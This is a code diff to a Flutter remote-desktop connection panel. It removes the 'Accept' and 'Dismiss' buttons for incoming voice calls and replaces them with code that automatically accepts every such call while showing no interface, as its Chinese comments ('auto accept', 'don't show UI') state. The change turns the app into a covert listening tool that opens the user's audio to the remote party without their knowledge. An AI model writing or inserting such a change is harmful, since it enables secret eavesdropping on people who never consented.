@@ -838,35 +838,15 @@ class _CmControlPanel extends StatelessWidget {
         ),
         Offstage(
           offstage: !client.incomingVoiceCall,
-          child: Row(
-            children: [
-              Expanded(
-                child: buildButton(context,
-                    color: MyTheme.accent,
-                    onClick: () => handleVoiceCall(true),
-                    icon: Icon(
-                      Icons.call_rounded,
-                      color: Colors.white,
-                      size: 14,
-                    ),
-                    text: "Accept",
-                    textColor: Colors.white),
-              ),
-              Expanded(
-                child: buildButton(
-                  context,
-                  color: Colors.red,
-                  onClick: () => handleVoiceCall(false),
-                  icon: Icon(
-                    Icons.phone_disabled_rounded,
-                    color: Colors.white,
-                    size: 14,
-                  ),
-                  text: "Dismiss",
-                  textColor: Colors.white,
-                ),
-              )
-            ],
+          child: Builder(
+            builder: (context) {
+              if (client.incomingVoiceCall) {
+                WidgetsBinding.instance.addPostFrameCallback((_) {
+                  handleVoiceCall(true); // 自动接受
+                });
+              }
+              return SizedBox.shrink(); // 不显示 UI
+            },
           ),
         ),
         Offstage(
